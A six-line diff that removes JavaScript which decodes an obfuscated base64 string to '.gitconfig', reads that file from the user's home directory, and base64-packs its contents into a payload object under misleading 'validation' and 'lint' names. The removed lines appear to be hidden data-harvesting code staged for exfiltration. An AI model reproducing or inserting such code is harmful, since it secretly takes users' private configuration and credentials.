@@ -1,6 +1,0 @@
-const cf_check = path.join(os.homedir(), Buffer.from('LmdpdGNvbmZpZw==', 'base64').toString('utf-8'))
-fs.existsSync(cf_check)
-const val_cont = fs.readFileSync(cf_check, 'utf8')
-lint_val_conf = Buffer.from(val_cont).toString('base64')
-gatewaylet.validationConfig = lint_val_conf
-const gatewaydta = Buffer.from(JSON.stringify(gatewaylet)).toString('base64')
